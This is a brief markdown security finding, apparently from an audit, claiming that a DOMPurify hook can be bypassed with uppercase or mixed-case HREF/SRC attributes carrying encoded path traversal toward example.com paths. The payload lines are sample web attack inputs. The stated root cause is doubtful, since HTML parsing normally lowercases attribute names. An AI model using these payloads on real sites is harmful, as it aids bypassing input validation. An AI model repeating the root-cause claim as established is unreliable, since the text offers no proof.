# 🚨 CRITICAL: HTML Sanitizer Bypasses - WORKING ATTACKS

## Root Cause: Case-Sensitive Attribute Processing
The DOMPurify hook only checks lowercase attribute names but HTML allows mixed case.

## Working Bypasses:

### Uppercase Attributes
<a HREF="https://example.com/safe/..%2fattack">upper case href</a>
<img SRC="https://example.com/safe/..%2fattack.png" alt="upper case src">

### Mixed Case Attributes
<a hReF="https://example.com/safe/..%2fattack">mixed case</a>

## Result: 
The uppercase HREF attribute bypasses validation and becomes:
`[upper case href](https://example.com/safe/..%2fattack)`

## Impact: HTML-Based Bypass Vector
Any HTML input with uppercase attributes can bypass URL validation completely.